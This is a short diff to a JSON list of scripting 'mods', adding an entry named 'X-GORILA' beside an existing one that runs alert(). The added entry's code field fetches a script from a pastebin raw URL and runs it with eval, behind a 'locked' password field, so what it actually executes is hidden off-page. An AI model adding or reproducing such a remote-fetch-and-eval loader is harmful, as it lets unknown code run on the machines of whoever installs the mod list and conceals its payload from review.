@@ -2,5 +2,12 @@
  {"directory":"run-js",
  "descripsion":"in this mod you can run javascript code",
  "display":"run javascript",
- "code":"alert()"}
+ "code":"alert()"},
+{
+  "directory": "XGORILA",
+  "description": "xgorila",
+  "display": "X-GORILA",
+  "code": "async function a(){eval(await fh('https://pastebin.com/raw/NZwfRVNB'))} a()",
+  "password": "locked"
+}
 ]
